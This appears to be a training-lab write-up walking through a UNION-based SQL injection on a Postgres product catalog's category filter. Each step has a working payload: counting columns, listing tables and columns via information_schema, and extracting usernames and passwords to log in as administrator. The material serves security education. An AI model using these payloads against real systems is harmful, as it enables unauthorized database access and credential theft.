## Analysis

The initial step is to understand how the vulnerable application works and gather information about the target system. The application showcases a product catalog with a product name and description. The navbar contains a feature to filter out products by category.

We confirmed that the application is running a `Postgres` database.

Using `ORDER BY` clauses,Â it was determined that the Query returns **two** columns.

```bash
/filter?category=Accessories'+ORDER+BY+2+--
```

## Listing Tables

We can use the payload below to list all tables in the `information_schema`.

```bash
'+union+select+null,table_name+from+information_schema.tables+--
```

From the response, we can determine valuable table names that are likely to contain user information. In this case, this table is `users_zxcvbl`.

## Listing Columns

After finding a table name we can move forward and list all column names inside of that table.

```bash
'+union+select+null,column_name+from+information_schema.columns+where+table_name='users_zxcvbl'+--
```

## Listing Username and Password

Now that we have determined the table and column name, we can move forward and craft a payload to extract the credentials of the `administrator` user.

```bash
'+union+select+null,username_wjxsgn+from+users_zxcvbl+--
```

![Usernames](img/usernames.png)

```bash
'+union+select+username_wjxsgn,password_iylvak+from+users_zxcvbl+--
```

After retrieving the credentials of the `administrator` user log in to solve this lab.
